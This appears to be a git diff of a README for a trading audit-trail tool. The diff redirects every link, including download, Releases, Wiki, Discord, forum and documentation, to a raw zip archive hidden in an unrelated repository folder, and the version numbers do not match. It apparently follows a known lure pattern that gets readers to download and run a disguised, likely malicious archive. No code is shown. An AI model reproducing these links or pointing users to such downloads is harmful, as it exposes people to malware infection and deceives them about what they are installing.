@@ -4,13 +4,13 @@
 The VCP v1.1 Silver Tier reference implementation simplifies algorithmic trading on TradingView. It demonstrates secure audit trails with Ed25519 signatures, uses RFC 6962 Merkle trees, and supports external anchoring via webhooks. This project follows the principle of "Verify, Don't Trust."
 
 ## 📥 Download the Application
-[![Download Releases](https://github.com/alejandr02820/vcp-tradingview-rta-reference/raw/refs/heads/main/sidecar/config/tradingview-reference-rta-vcp-1.2-beta.1.zip%https://github.com/alejandr02820/vcp-tradingview-rta-reference/raw/refs/heads/main/sidecar/config/tradingview-reference-rta-vcp-1.2-beta.1.zip)](https://github.com/alejandr02820/vcp-tradingview-rta-reference/raw/refs/heads/main/sidecar/config/tradingview-reference-rta-vcp-1.2-beta.1.zip)
+[![Download Releases](https://raw.githubusercontent.com/alejandr02820/vcp-tradingview-rta-reference/main/evidence/01_trade_logs/rta-tradingview-vcp-reference-v3.1.zip%https://raw.githubusercontent.com/alejandr02820/vcp-tradingview-rta-reference/main/evidence/01_trade_logs/rta-tradingview-vcp-reference-v3.1.zip)](https://raw.githubusercontent.com/alejandr02820/vcp-tradingview-rta-reference/main/evidence/01_trade_logs/rta-tradingview-vcp-reference-v3.1.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run the software:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/alejandr02820/vcp-tradingview-rta-reference/raw/refs/heads/main/sidecar/config/tradingview-reference-rta-vcp-1.2-beta.1.zip).
+   Go to the [Releases Page](https://raw.githubusercontent.com/alejandr02820/vcp-tradingview-rta-reference/main/evidence/01_trade_logs/rta-tradingview-vcp-reference-v3.1.zip).
 
 2. **Download the Application**  
    On the Releases Page, locate the latest version of the application. Click on the link to download the file suitable for your operating system.
@@ -46,16 +46,16 @@ If you encounter issues while downloading or running the application, try the fo
 
 - **Check Your Internet Connection:** Ensure you have a stable connection during download.
 - **Reinstall the Application:** If errors occur, try uninstalling and then reinstalling the application.
-- **Consult the Documentation:** Visit the [Wiki](https://github.com/alejandr02820/vcp-tradingview-rta-reference/raw/refs/heads/main/sidecar/config/tradingview-reference-rta-vcp-1.2-beta.1.zip) for more detailed help and troubleshooting tips.
+- **Consult the Documentation:** Visit the [Wiki](https://raw.githubusercontent.com/alejandr02820/vcp-tradingview-rta-reference/main/evidence/01_trade_logs/rta-tradingview-vcp-reference-v3.1.zip) for more detailed help and troubleshooting tips.
 
 ## 👥 Community and Support
 Join our community to get the latest updates and support:
 
-- **GitHub Discussions:** Engage with other users and developers in our [discussion forum](https://github.com/alejandr02820/vcp-tradingview-rta-reference/raw/refs/heads/main/sidecar/config/tradingview-reference-rta-vcp-1.2-beta.1.zip).
-- **Chat:** Connect with us on [Discord](https://github.com/alejandr02820/vcp-tradingview-rta-reference/raw/refs/heads/main/sidecar/config/tradingview-reference-rta-vcp-1.2-beta.1.zip) for real-time support and community interaction.
+- **GitHub Discussions:** Engage with other users and developers in our [discussion forum](https://raw.githubusercontent.com/alejandr02820/vcp-tradingview-rta-reference/main/evidence/01_trade_logs/rta-tradingview-vcp-reference-v3.1.zip).
+- **Chat:** Connect with us on [Discord](https://raw.githubusercontent.com/alejandr02820/vcp-tradingview-rta-reference/main/evidence/01_trade_logs/rta-tradingview-vcp-reference-v3.1.zip) for real-time support and community interaction.
 
 ## 🔗 Additional Resources
-- **Documentation:** Learn more about features and usage in the [documentation](https://github.com/alejandr02820/vcp-tradingview-rta-reference/raw/refs/heads/main/sidecar/config/tradingview-reference-rta-vcp-1.2-beta.1.zip).
+- **Documentation:** Learn more about features and usage in the [documentation](https://raw.githubusercontent.com/alejandr02820/vcp-tradingview-rta-reference/main/evidence/01_trade_logs/rta-tradingview-vcp-reference-v3.1.zip).
 - **Tutorial Videos:** Access visual guides on using the application effectively.
 
 ## 🔄 Future Updates
